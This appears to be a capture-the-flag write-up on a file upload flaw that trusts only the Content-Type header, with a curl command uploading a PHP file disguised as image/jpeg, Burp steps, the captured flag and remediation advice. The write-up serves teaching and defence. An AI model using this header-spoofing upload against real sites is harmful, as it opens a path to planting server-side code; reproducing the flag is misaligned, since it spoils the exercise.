# Content-Type File Upload Vulnerability

## 🎯 Overview
This vulnerability demonstrates a weak file upload validation system that only checks the Content-Type header, allowing malicious file uploads through simple header manipulation.

## 🔍 Vulnerability Details
The application at `/index.php?page=upload` implements insufficient file upload validation:
- Only validates Content-Type header
- Fails to verify actual file content
- No proper file extension validation
- Missing file content analysis

## ⚔️ Exploitation Process

### Tools Required
- **Burp Suite** (optional for header manipulation)
- **cURL** (for command-line exploitation)
- Text editor for creating payload

### Method 1: Using cURL
```bash
# Create malicious PHP file and exploit using cURL
echo '<?php echo "I am bad" ?>' > /tmp/bad.php && \
curl -X POST \
  -F "Upload=Upload" \
  -F "uploaded=@/tmp/bad.php;type=image/jpeg" \
  "http://x.x.x.x/index.php?page=upload" \
  | grep 'The flag is :'
```

### Method 2: Using Burp Suite
1. Intercept the upload request
2. Modify the Content-Type header from `application/octet-stream` to `image/jpeg`
3. Forward the modified request

### Attack Result
**Flag**: 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8

## 🛡️ Security Issues Identified
1. Weak file upload validation
2. Content-Type header trust
3. Missing file content validation
4. Insufficient extension checking
5. No file analysis implementation

## 🔒 Recommended Security Fixes

### 1. Implement Comprehensive File Validation
```python
# Example validation logic
def validate_file(file):
    # Check file extension
    allowed_extensions = ['jpg', 'jpeg', 'png']
    if not file.filename.lower().endswith(tuple(allowed_extensions)):
        return False
        
    # Verify actual content type
    if not imghdr.what(file):
        return False
        
    # Check file size
    if len(file.read()) > MAX_FILE_SIZE:
        return False
        
    return True
```

### 2. Security Measures Checklist
- [ ] Implement proper file extension whitelist
- [ ] Verify actual file content (not just headers)
- [ ] Implement file size limits
- [ ] Generate new random filenames
- [ ] Set proper file permissions
- [ ] Scan for malware
- [ ] Store files outside web root
- [ ] Use secure file storage location

### 3. Additional Security Controls
- File content analysis
- Image file validation
- Antivirus integration
- File metadata stripping
- Secure file storage configuration

## 📝 Best Practices for File Upload Security

### File Naming
```python
import uuid
def secure_filename(filename):
    # Generate random filename with original extension
    ext = filename.split('.')[-1]
    return f"{uuid.uuid4()}.{ext}"
```

### Storage Configuration
```nginx
# Nginx configuration example
location /uploads {
    internal;
    add_header Content-Type application/octet-stream;
    add_header Content-Disposition attachment;
}
```

## 📚 Additional Resources
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [File Upload Security Best Practices](https://www.sans.org/blog/8-basic-rules-to-implement-secure-file-uploads/)
- [Content-Type Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type)

## ⚠️ Disclaimer
This documentation is for educational purposes only. Always obtain proper authorization before testing security measures on any system.